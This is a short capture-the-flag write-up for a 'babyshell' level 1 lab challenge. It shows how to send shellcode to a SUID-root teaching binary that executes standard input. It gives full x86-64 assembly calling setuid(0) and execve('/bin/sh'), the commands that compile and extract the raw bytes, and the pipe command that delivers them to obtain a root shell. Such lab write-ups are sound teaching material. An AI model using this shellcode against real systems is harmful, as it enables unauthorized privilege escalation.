## Level 1

List the file in the current directory. There is a SUID program called `babyshell_level1_teaching1` and its owner is root. So we can exploit it to leak the contents of flag. 

[babyshell-1]

According to the hint: the standard input will be read into memory at 0x17011000 and executed. So our goal is to write a shellcode and send it as a standard input. 

[babyshell-2]

[babyshell-3]

Write the shellcode program in `/tmp` directory. The program aims to invoke setuid(0) and execve("/bin/sh").

```assembly
.global _start

_start: 
.intel_syntax noprefix
	mov rax, 0x69		; setuid 
	mov rdi, 0
	syscall 
	
	mov rax, 0x3b 		; execve
	lea rdi, [rip+filename]
	mov rsi, 0
	mov rdx, 0
	syscall 

filename:
	.string "/bin/sh"
```

Compile it as a binary file and use objcopy command to extract the raw shellcode. 

```
$ gcc -nostdlib -static shellcode.s -o shellcode
$ objcopy --dump-section .text=shellcode-raw shellcode
```

So we can get the flag. 

```
$ (cat ./tmp/shellcode-raw; cat) | ./babyshell_level1_teaching1
```

[babyshell-4]